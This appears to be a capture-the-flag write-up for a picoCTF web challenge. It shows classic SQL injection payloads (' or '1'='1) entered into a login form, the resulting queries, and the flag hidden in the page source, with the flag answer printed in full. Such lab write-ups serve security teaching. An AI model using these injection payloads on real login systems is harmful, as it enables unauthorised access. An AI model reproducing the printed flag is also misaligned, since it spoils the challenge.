# Web

# Flag: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}

Can you login to this website? Try to login here.

http://saturn.picoctf.net:62760/

Login page

Try username as `' OR 1=1`

Error:
username: ' or 1=1
password: fdssfd
SQL query: SELECT * FROM users WHERE name='' or 1=1' AND password='fdssfd'

Try login and password as `' or '1'='1`

```
username: ' or '1'='1
password: ' or '1'='1
SQL query: SELECT * FROM users WHERE name='' or '1'='1' AND password='' or '1'='1'

Logged in! But can you see the flag, it is in plainsight.
```

View source:
```
<pre>username: &#039; or &#039;1&#039;=&#039;1
password: &#039; or &#039;1&#039;=&#039;1
SQL query: SELECT * FROM users WHERE name=&#039;&#039; or &#039;1&#039;=&#039;1&#039; AND password=&#039;&#039; or &#039;1&#039;=&#039;1&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>
```